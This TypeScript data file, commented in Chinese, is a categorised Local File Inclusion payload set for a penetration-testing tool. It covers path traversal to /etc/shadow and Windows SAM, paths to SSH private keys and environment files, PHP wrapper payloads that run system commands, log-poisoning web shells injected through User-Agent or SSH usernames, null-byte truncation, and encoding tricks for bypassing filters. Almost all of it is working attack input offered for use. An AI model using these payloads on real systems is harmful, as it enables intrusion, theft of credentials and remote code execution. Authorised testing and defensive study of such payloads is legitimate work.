/**
 * LFI (本地文件包含) Payload 数据集
 * 包含路径穿越、PHP 伪协议、日志投毒、空字节截断、编码绕过、敏感文件等分类
 * 用于渗透测试中的 LFI 漏洞验证
 */

/** LFI Payload 数据结构 */
export interface LfiPayload {
    id: string
    /** 名称 */
    name: string
    /** 实际 Payload 内容 */
    payload: string
    /** 所属分类 */
    category: string
    /** 适用平台: all / linux / windows */
    platform: string
    /** 补充描述 */
    description?: string
    /** 是否属于绕过型 Payload */
    bypass?: boolean
}

/** LFI 分类定义 */
export interface LfiCategory {
    id: string
    name: string
    nameEn: string
    payloads: LfiPayload[]
}

/** 分类元数据（用于 Select 选项） */
export const lfiCategoryMeta: { id: string; name: string; nameEn: string }[] = [
    { id: "path_traversal", name: "路径穿越", nameEn: "Path Traversal" },
    { id: "sensitive_files", name: "敏感文件", nameEn: "Sensitive Files" },
    { id: "php_wrapper", name: "PHP 伪协议", nameEn: "PHP Wrapper" },
    { id: "log_poisoning", name: "日志投毒", nameEn: "Log Poisoning" },
    { id: "null_byte", name: "空字节截断", nameEn: "Null Byte" },
    { id: "encoding_bypass", name: "编码绕过", nameEn: "Encoding Bypass" },
]

/** 平台元数据 */
export const lfiPlatformMeta: { id: string; name: string; nameEn: string }[] = [
    { id: "all", name: "全部", nameEn: "All" },
    { id: "linux", name: "Linux", nameEn: "Linux" },
    { id: "windows", name: "Windows", nameEn: "Windows" },
]

// ============================================================
// 辅助函数：生成不同深度的路径穿越 Payload
// ============================================================
function generateTraversals(file: string, platform: string, maxDepth: number = 10): LfiPayload[] {
    const results: LfiPayload[] = []
    for (let i = 1; i <= maxDepth; i++) {
        const prefix = "../".repeat(i)
        results.push({
            id: `pt-${platform}-d${i}-${file.replace(/[\/\\.:*]/g, "_")}`,
            name: `${"../".repeat(i)}${file}`,
            payload: `${prefix}${file}`,
            category: "path_traversal",
            platform,
            description: `${i} 级目录穿越`,
        })
    }
    return results
}

// ============================================================
// 路径穿越 (Path Traversal)
// ============================================================
const pathTraversal: LfiCategory = {
    name: "路径穿越",
    id: "path_traversal",
    nameEn: "Path Traversal",
    payloads: [
        ...generateTraversals("etc/passwd", "linux"),
        ...generateTraversals("etc/shadow", "linux"),
        ...generateTraversals("Windows/win.ini", "windows"),
        ...generateTraversals("Windows/System32/drivers/etc/hosts", "windows"),
        {
            id: "pt-abs-linux-passwd",
            name: "绝对路径 /etc/passwd",
            payload: `/etc/passwd`,
            category: "path_traversal",
            platform: "linux",
        },
        {
            id: "pt-abs-linux-shadow",
            name: "绝对路径 /etc/shadow",
            payload: `/etc/shadow`,
            category: "path_traversal",
            platform: "linux",
        },
        {
            id: "pt-abs-win-ini",
            name: "绝对路径 win.ini",
            payload: `C:\\Windows\\win.ini`,
            category: "path_traversal",
            platform: "windows",
        },
        {
            id: "pt-dotdot-slash-bypass",
            name: "....// 双写绕过",
            payload: `....//....//....//....//etc/passwd`,
            category: "path_traversal",
            platform: "linux",
            bypass: true,
            description: "绕过将 ../ 替换为空的过滤",
        },
        {
            id: "pt-dotdot-backslash",
            name: "反斜杠穿越",
            payload: `..\\..\\..\\..\\Windows\\win.ini`,
            category: "path_traversal",
            platform: "windows",
            bypass: true,
        },
        {
            id: "pt-mixed-slash",
            name: "混合斜杠穿越",
            payload: `../..\\../..\\etc/passwd`,
            category: "path_traversal",
            platform: "all",
            bypass: true,
            description: "混合正反斜杠尝试绕过过滤",
        },
    ],
}

// ============================================================
// 敏感文件 (Sensitive Files)
// ============================================================
const sensitiveFiles: LfiCategory = {
    name: "敏感文件",
    id: "sensitive_files",
    nameEn: "Sensitive Files",
    payloads: [
        // ---- Linux 敏感文件 ----
        { id: "sf-linux-passwd", name: "/etc/passwd", payload: `/etc/passwd`, category: "sensitive_files", platform: "linux", description: "系统用户列表" },
        { id: "sf-linux-shadow", name: "/etc/shadow", payload: `/etc/shadow`, category: "sensitive_files", platform: "linux", description: "密码哈希（需 root 权限）" },
        { id: "sf-linux-group", name: "/etc/group", payload: `/etc/group`, category: "sensitive_files", platform: "linux", description: "用户组信息" },
        { id: "sf-linux-hosts", name: "/etc/hosts", payload: `/etc/hosts`, category: "sensitive_files", platform: "linux", description: "主机名映射" },
        { id: "sf-linux-hostname", name: "/etc/hostname", payload: `/etc/hostname`, category: "sensitive_files", platform: "linux", description: "主机名" },
        { id: "sf-linux-resolv", name: "/etc/resolv.conf", payload: `/etc/resolv.conf`, category: "sensitive_files", platform: "linux", description: "DNS 配置" },
        { id: "sf-linux-issue", name: "/etc/issue", payload: `/etc/issue`, category: "sensitive_files", platform: "linux", description: "系统版本信息" },
        { id: "sf-linux-os-release", name: "/etc/os-release", payload: `/etc/os-release`, category: "sensitive_files", platform: "linux", description: "操作系统发行版信息" },
        { id: "sf-linux-environ", name: "/proc/self/environ", payload: `/proc/self/environ`, category: "sensitive_files", platform: "linux", description: "当前进程环境变量" },
        { id: "sf-linux-cmdline", name: "/proc/self/cmdline", payload: `/proc/self/cmdline`, category: "sensitive_files", platform: "linux", description: "当前进程启动命令" },
        { id: "sf-linux-proc-fd", name: "/proc/self/fd/0", payload: `/proc/self/fd/0`, category: "sensitive_files", platform: "linux", description: "进程文件描述符" },
        { id: "sf-linux-proc-status", name: "/proc/self/status", payload: `/proc/self/status`, category: "sensitive_files", platform: "linux", description: "进程状态信息" },
        { id: "sf-linux-proc-version", name: "/proc/version", payload: `/proc/version`, category: "sensitive_files", platform: "linux", description: "内核版本" },
        { id: "sf-linux-proc-net-tcp", name: "/proc/net/tcp", payload: `/proc/net/tcp`, category: "sensitive_files", platform: "linux", description: "TCP 连接表" },
        { id: "sf-linux-proc-net-arp", name: "/proc/net/arp", payload: `/proc/net/arp`, category: "sensitive_files", platform: "linux", description: "ARP 缓存表" },
        { id: "sf-linux-crontab", name: "/etc/crontab", payload: `/etc/crontab`, category: "sensitive_files", platform: "linux", description: "定时任务" },
        { id: "sf-linux-ssh-config", name: "/etc/ssh/sshd_config", payload: `/etc/ssh/sshd_config`, category: "sensitive_files", platform: "linux", description: "SSH 服务配置" },
        { id: "sf-linux-ssh-key", name: "/home/*/.ssh/id_rsa", payload: `/home/{USER}/.ssh/id_rsa`, category: "sensitive_files", platform: "linux", description: "用户 SSH 私钥" },
        { id: "sf-linux-ssh-authkeys", name: "/home/*/.ssh/authorized_keys", payload: `/home/{USER}/.ssh/authorized_keys`, category: "sensitive_files", platform: "linux", description: "SSH 授权公钥" },
        { id: "sf-linux-bash-history", name: "/home/*/.bash_history", payload: `/home/{USER}/.bash_history`, category: "sensitive_files", platform: "linux", description: "Bash 命令历史" },
        { id: "sf-linux-root-history", name: "/root/.bash_history", payload: `/root/.bash_history`, category: "sensitive_files", platform: "linux", description: "root 命令历史" },
        { id: "sf-linux-root-sshkey", name: "/root/.ssh/id_rsa", payload: `/root/.ssh/id_rsa`, category: "sensitive_files", platform: "linux", description: "root SSH 私钥" },
        { id: "sf-linux-apache-log", name: "Apache access.log", payload: `/var/log/apache2/access.log`, category: "sensitive_files", platform: "linux", description: "Apache 访问日志" },
        { id: "sf-linux-apache-err", name: "Apache error.log", payload: `/var/log/apache2/error.log`, category: "sensitive_files", platform: "linux", description: "Apache 错误日志" },
        { id: "sf-linux-nginx-log", name: "Nginx access.log", payload: `/var/log/nginx/access.log`, category: "sensitive_files", platform: "linux", description: "Nginx 访问日志" },
        { id: "sf-linux-nginx-err", name: "Nginx error.log", payload: `/var/log/nginx/error.log`, category: "sensitive_files", platform: "linux", description: "Nginx 错误日志" },
        { id: "sf-linux-auth-log", name: "/var/log/auth.log", payload: `/var/log/auth.log`, category: "sensitive_files", platform: "linux", description: "认证日志" },
        { id: "sf-linux-syslog", name: "/var/log/syslog", payload: `/var/log/syslog`, category: "sensitive_files", platform: "linux", description: "系统日志" },
        { id: "sf-linux-mail-log", name: "/var/log/mail.log", payload: `/var/log/mail.log`, category: "sensitive_files", platform: "linux", description: "邮件日志" },
        { id: "sf-linux-mysql-conf", name: "/etc/mysql/my.cnf", payload: `/etc/mysql/my.cnf`, category: "sensitive_files", platform: "linux", description: "MySQL 配置" },
        { id: "sf-linux-php-ini", name: "/etc/php/php.ini", payload: `/etc/php/{VERSION}/apache2/php.ini`, category: "sensitive_files", platform: "linux", description: "PHP 配置" },
        { id: "sf-linux-nginx-conf", name: "Nginx 主配置", payload: `/etc/nginx/nginx.conf`, category: "sensitive_files", platform: "linux", description: "Nginx 配置文件" },
        { id: "sf-linux-apache-conf", name: "Apache 主配置", payload: `/etc/apache2/apache2.conf`, category: "sensitive_files", platform: "linux", description: "Apache 配置文件" },

        // ---- Windows 敏感文件 ----
        { id: "sf-win-ini", name: "win.ini", payload: `C:\\Windows\\win.ini`, category: "sensitive_files", platform: "windows", description: "Windows 配置文件" },
        { id: "sf-win-system-ini", name: "system.ini", payload: `C:\\Windows\\system.ini`, category: "sensitive_files", platform: "windows", description: "系统初始化配置" },
        { id: "sf-win-hosts", name: "Windows hosts", payload: `C:\\Windows\\System32\\drivers\\etc\\hosts`, category: "sensitive_files", platform: "windows", description: "主机名映射" },
        { id: "sf-win-sam", name: "SAM 数据库", payload: `C:\\Windows\\System32\\config\\SAM`, category: "sensitive_files", platform: "windows", description: "本地用户密码数据库" },
        { id: "sf-win-system", name: "SYSTEM 注册表", payload: `C:\\Windows\\System32\\config\\SYSTEM`, category: "sensitive_files", platform: "windows", description: "系统注册表蜂巢" },
        { id: "sf-win-software", name: "SOFTWARE 注册表", payload: `C:\\Windows\\System32\\config\\SOFTWARE`, category: "sensitive_files", platform: "windows", description: "软件注册表蜂巢" },
        { id: "sf-win-boot-ini", name: "boot.ini", payload: `C:\\boot.ini`, category: "sensitive_files", platform: "windows", description: "启动配置（旧版）" },
        { id: "sf-win-iis-log", name: "IIS 日志", payload: `C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log`, category: "sensitive_files", platform: "windows", description: "IIS 访问日志" },
        { id: "sf-win-webconfig", name: "web.config", payload: `C:\\inetpub\\wwwroot\\web.config`, category: "sensitive_files", platform: "windows", description: "IIS Web 应用配置" },
        { id: "sf-win-unattend", name: "unattend.xml", payload: `C:\\Windows\\Panther\\unattend.xml`, category: "sensitive_files", platform: "windows", description: "无人值守安装配置（可能含密码）" },
        { id: "sf-win-repair-sam", name: "SAM 备份", payload: `C:\\Windows\\repair\\SAM`, category: "sensitive_files", platform: "windows", description: "SAM 数据库备份" },
        { id: "sf-win-php-ini", name: "Windows php.ini", payload: `C:\\php\\php.ini`, category: "sensitive_files", platform: "windows", description: "PHP 配置文件" },
        { id: "sf-win-mysql-ini", name: "Windows my.ini", payload: `C:\\mysql\\my.ini`, category: "sensitive_files", platform: "windows", description: "MySQL 配置文件" },
    ],
}

// ============================================================
// PHP 伪协议 (PHP Wrappers)
// ============================================================
const phpWrapper: LfiCategory = {
    name: "PHP 伪协议",
    id: "php_wrapper",
    nameEn: "PHP Wrapper",
    payloads: [
        {
            id: "php-filter-b64",
            name: "php://filter Base64 读取",
            payload: `php://filter/convert.base64-encode/resource={FILE}`,
            category: "php_wrapper",
            platform: "all",
            description: "Base64 编码读取源码，绕过 PHP 执行",
        },
        {
            id: "php-filter-rot13",
            name: "php://filter ROT13 读取",
            payload: `php://filter/string.rot13/resource={FILE}`,
            category: "php_wrapper",
            platform: "all",
            description: "ROT13 编码读取源码",
        },
        {
            id: "php-filter-utf7",
            name: "php://filter UTF-7 读取",
            payload: `php://filter/convert.iconv.UTF-8.UTF-7/resource={FILE}`,
            category: "php_wrapper",
            platform: "all",
            description: "UTF-7 编码转换读取",
        },
        {
            id: "php-filter-utf16",
            name: "php://filter UTF-16 读取",
            payload: `php://filter/convert.iconv.UTF-8.UTF-16/resource={FILE}`,
            category: "php_wrapper",
            platform: "all",
            description: "UTF-16 编码转换读取",
        },
        {
            id: "php-filter-zlib",
            name: "php://filter zlib 压缩",
            payload: `php://filter/zlib.deflate/convert.base64-encode/resource={FILE}`,
            category: "php_wrapper",
            platform: "all",
            description: "zlib 压缩后 Base64 编码",
        },
        {
            id: "php-filter-chain-b64",
            name: "php://filter 链式 Base64",
            payload: `php://filter/read=convert.base64-encode/resource={FILE}`,
            category: "php_wrapper",
            platform: "all",
            description: "显式 read 链式读取",
        },
        {
            id: "php-filter-stripped",
            name: "php://filter 去标签",
            payload: `php://filter/string.strip_tags/resource={FILE}`,
            category: "php_wrapper",
            platform: "all",
            description: "去除 HTML/PHP 标签读取",
        },
        {
            id: "php-input",
            name: "php://input (POST RCE)",
            payload: `php://input`,
            category: "php_wrapper",
            platform: "all",
            description: "POST 请求体作为文件内容，可配合 <?php system('id'); ?> 执行命令",
        },
        {
            id: "php-data-plain",
            name: "data:// 明文执行",
            payload: `data://text/plain,<?php system('id'); ?>`,
            category: "php_wrapper",
            platform: "all",
            description: "data 伪协议直接执行 PHP 代码",
        },
        {
            id: "php-data-b64",
            name: "data:// Base64 执行",
            payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==`,
            category: "php_wrapper",
            platform: "all",
            description: "data 伪协议 Base64 编码执行 (<?php system('id'); ?>)",
        },
        {
            id: "php-expect",
            name: "expect:// 命令执行",
            payload: `expect://id`,
            category: "php_wrapper",
            platform: "all",
            description: "需要安装 expect 扩展",
        },
        {
            id: "php-zip",
            name: "zip:// 包含",
            payload: `zip:///tmp/shell.zip#shell.php`,
            category: "php_wrapper",
            platform: "all",
            description: "从 zip 压缩包中包含文件",
        },
        {
            id: "php-phar",
            name: "phar:// 包含",
            payload: `phar:///tmp/shell.phar/shell.php`,
            category: "php_wrapper",
            platform: "all",
            description: "从 phar 档案中包含文件，可触发反序列化",
        },
        {
            id: "php-phar-jpg",
            name: "phar:// 伪装为图片",
            payload: `phar:///var/www/uploads/avatar.jpg/shell.php`,
            category: "php_wrapper",
            platform: "all",
            description: "phar 伪装为图片上传后包含",
            bypass: true,
        },
        {
            id: "php-file",
            name: "file:// 协议读取",
            payload: `file:///etc/passwd`,
            category: "php_wrapper",
            platform: "linux",
            description: "file 伪协议直接读取本地文件",
        },
        {
            id: "php-file-win",
            name: "file:// 协议读取 (Windows)",
            payload: `file:///C:/Windows/win.ini`,
            category: "php_wrapper",
            platform: "windows",
        },
        {
            id: "php-glob",
            name: "glob:// 目录遍历",
            payload: `glob:///var/www/html/*.php`,
            category: "php_wrapper",
            platform: "all",
            description: "列举匹配文件路径（需配合 DirectoryIterator）",
        },
        {
            id: "php-filter-chain-rce",
            name: "php://filter chain RCE",
            payload: `php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp`,
            category: "php_wrapper",
            platform: "all",
            description: "Filter chain 技术构造任意字符实现 RCE",
            bypass: true,
        },
    ],
}

// ============================================================
// 日志投毒 (Log Poisoning)
// ============================================================
const logPoisoning: LfiCategory = {
    name: "日志投毒",
    id: "log_poisoning",
    nameEn: "Log Poisoning",
    payloads: [
        {
            id: "log-apache-access",
            name: "Apache access.log 投毒",
            payload: `/var/log/apache2/access.log`,
            category: "log_poisoning",
            platform: "linux",
            description: "先通过 User-Agent 注入 PHP 代码: <?php system($_GET['cmd']); ?>",
        },
        {
            id: "log-apache-error",
            name: "Apache error.log 投毒",
            payload: `/var/log/apache2/error.log`,
            category: "log_poisoning",
            platform: "linux",
            description: "通过请求不存在的文件名触发错误日志写入",
        },
        {
            id: "log-apache-alt",
            name: "Apache 日志 (旧路径)",
            payload: `/var/log/httpd/access_log`,
            category: "log_poisoning",
            platform: "linux",
            description: "CentOS/RHEL 默认 Apache 日志路径",
        },
        {
            id: "log-nginx-access",
            name: "Nginx access.log 投毒",
            payload: `/var/log/nginx/access.log`,
            category: "log_poisoning",
            platform: "linux",
            description: "通过 User-Agent 注入 PHP 代码",
        },
        {
            id: "log-nginx-error",
            name: "Nginx error.log 投毒",
            payload: `/var/log/nginx/error.log`,
            category: "log_poisoning",
            platform: "linux",
        },
        {
            id: "log-auth",
            name: "SSH auth.log 投毒",
            payload: `/var/log/auth.log`,
            category: "log_poisoning",
            platform: "linux",
            description: "通过 SSH 用户名注入: ssh '<?php system(\"id\"); ?>'@target",
        },
        {
            id: "log-mail",
            name: "邮件日志投毒",
            payload: `/var/log/mail.log`,
            category: "log_poisoning",
            platform: "linux",
            description: "通过发送含 PHP 代码的邮件触发",
        },
        {
            id: "log-vsftpd",
            name: "vsftpd 日志投毒",
            payload: `/var/log/vsftpd.log`,
            category: "log_poisoning",
            platform: "linux",
            description: "通过 FTP 用户名注入 PHP 代码",
        },
        {
            id: "log-proc-self-fd",
            name: "/proc/self/fd 日志投毒",
            payload: `/proc/self/fd/2`,
            category: "log_poisoning",
            platform: "linux",
            description: "通过进程 fd 访问 stderr 日志",
        },
        {
            id: "log-php-session",
            name: "PHP session 文件投毒",
            payload: `/tmp/sess_{SESSION_ID}`,
            category: "log_poisoning",
            platform: "linux",
            description: "通过可控 session 值注入 PHP 代码",
        },
        {
            id: "log-php-session-var",
            name: "PHP session (var 路径)",
            payload: `/var/lib/php/sessions/sess_{SESSION_ID}`,
            category: "log_poisoning",
            platform: "linux",
            description: "Debian/Ubuntu 默认 session 路径",
        },
        {
            id: "log-iis-win",
            name: "IIS 日志投毒 (Windows)",
            payload: `C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex{DATE}.log`,
            category: "log_poisoning",
            platform: "windows",
            description: "Windows IIS 访问日志",
        },
    ],
}

// ============================================================
// 空字节截断 (Null Byte)
// ============================================================
const nullByte: LfiCategory = {
    name: "空字节截断",
    id: "null_byte",
    nameEn: "Null Byte",
    payloads: [
        {
            id: "null-basic",
            name: "%00 截断",
            payload: `../../../etc/passwd%00`,
            category: "null_byte",
            platform: "linux",
            description: "PHP < 5.3.4 空字节截断后缀",
            bypass: true,
        },
        {
            id: "null-basic-win",
            name: "%00 截断 (Windows)",
            payload: `..\\..\\..\\Windows\\win.ini%00`,
            category: "null_byte",
            platform: "windows",
            bypass: true,
        },
        {
            id: "null-url-encoded",
            name: "%2500 截断",
            payload: `../../../etc/passwd%2500`,
            category: "null_byte",
            platform: "linux",
            description: "双重 URL 编码空字节",
            bypass: true,
        },
        {
            id: "null-0x00",
            name: "\\x00 截断",
            payload: `../../../etc/passwd\x00`,
            category: "null_byte",
            platform: "linux",
            description: "原始空字节",
            bypass: true,
        },
        {
            id: "null-with-ext",
            name: "%00.php 截断",
            payload: `../../../etc/passwd%00.php`,
            category: "null_byte",
            platform: "linux",
            description: "空字节截断 .php 后缀拼接",
            bypass: true,
        },
        {
            id: "null-with-jpg",
            name: "%00.jpg 截断",
            payload: `../../../etc/passwd%00.jpg`,
            category: "null_byte",
            platform: "linux",
            description: "空字节截断图片后缀校验",
            bypass: true,
        },
        {
            id: "null-long-path",
            name: "长路径截断",
            payload: `../../../etc/passwd/${"A".repeat(4096)}`,
            category: "null_byte",
            platform: "linux",
            description: "超长路径截断（Linux PATH_MAX 4096）",
            bypass: true,
        },
        {
            id: "null-dot-truncation",
            name: "点号截断 (Windows)",
            payload: `..\\..\\..\\Windows\\win.ini.....................................................................`,
            category: "null_byte",
            platform: "windows",
            description: "Windows 会忽略文件名末尾的点号",
            bypass: true,
        },
    ],
}

// ============================================================
// 编码绕过 (Encoding Bypass)
// ============================================================
const encodingBypass: LfiCategory = {
    name: "编码绕过",
    id: "encoding_bypass",
    nameEn: "Encoding Bypass",
    payloads: [
        {
            id: "enc-url-single",
            name: "URL 编码 ../",
            payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "单次 URL 编码",
            bypass: true,
        },
        {
            id: "enc-url-double",
            name: "双重 URL 编码 ../",
            payload: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "双重 URL 编码绕过单次解码的过滤",
            bypass: true,
        },
        {
            id: "enc-url-dot-slash",
            name: "URL 编码混合",
            payload: `..%2f..%2f..%2fetc/passwd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "仅编码斜杠",
            bypass: true,
        },
        {
            id: "enc-url-backslash",
            name: "URL 编码反斜杠",
            payload: `..%5c..%5c..%5cWindows%5cwin.ini`,
            category: "encoding_bypass",
            platform: "windows",
            bypass: true,
        },
        {
            id: "enc-utf8-overlong-2",
            name: "UTF-8 超长编码 (2字节 /)",
            payload: `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "UTF-8 超长编码斜杠 (CVE-2001-0333)",
            bypass: true,
        },
        {
            id: "enc-utf8-overlong-3",
            name: "UTF-8 超长编码 (3字节 /)",
            payload: `..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "UTF-8 3 字节超长编码斜杠",
            bypass: true,
        },
        {
            id: "enc-utf8-overlong-dot",
            name: "UTF-8 超长编码 (2字节 .)",
            payload: `%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "UTF-8 超长编码点和斜杠",
            bypass: true,
        },
        {
            id: "enc-16bit-unicode",
            name: "16 位 Unicode 编码",
            payload: `..%u2215..%u2215..%u2215etc%u2215passwd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "IIS Unicode 编码绕过",
            bypass: true,
        },
        {
            id: "enc-double-url-win",
            name: "双重编码 (Windows)",
            payload: `%252e%252e%255c%252e%252e%255cWindows%255cwin.ini`,
            category: "encoding_bypass",
            platform: "windows",
            bypass: true,
        },
        {
            id: "enc-html-entity",
            name: "HTML 实体编码",
            payload: `&#46;&#46;/&#46;&#46;/&#46;&#46;/etc/passwd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "HTML 十进制实体编码点号",
            bypass: true,
        },
        {
            id: "enc-url-partial",
            name: "部分编码 ../ ",
            payload: `.%2e/%2e%2e/%2e%2e/etc/passwd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "部分 URL 编码可绕过正则匹配",
            bypass: true,
        },
        {
            id: "enc-double-write",
            name: "双写绕过 ../",
            payload: `....//....//....//etc/passwd`,
            category: "encoding_bypass",
            platform: "linux",
            description: "双写 ../ 绕过替换为空的过滤",
            bypass: true,
        },
        {
            id: "enc-double-write-back",
            name: "双写绕过 ..\\",
            payload: `....\\\\....\\\\....\\\\Windows\\win.ini`,
            category: "encoding_bypass",
            platform: "windows",
            bypass: true,
        },
    ],
}

/** 所有分类列表 */
export const lfiCategories: LfiCategory[] = [
    pathTraversal,
    sensitiveFiles,
    phpWrapper,
    logPoisoning,
    nullByte,
    encodingBypass,
]

/**
 * 获取所有 Payload 的扁平列表
 */
export function getAllPayloads(): LfiPayload[] {
    return lfiCategories.flatMap(c => c.payloads)
}
